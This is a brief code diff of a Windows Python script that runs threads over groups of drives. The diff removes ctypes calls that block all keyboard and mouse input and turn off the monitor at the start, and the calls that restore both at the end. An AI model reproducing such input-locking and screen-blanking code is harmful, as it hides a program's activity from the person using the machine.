@@ -7,8 +7,7 @@ import win32gui
 import win32con
 import getpass
 
-ctypes.windll.user32.BlockInput(True)
-ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
+
 
 def enum_windows(hwnd, window_list):
     window_list.append(hwnd)
@@ -94,5 +93,4 @@ for group in drive_groups:
     for thread in threads:
         thread.join()
 
-ctypes.windll.user32.BlockInput(False)
-ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, -1)
+
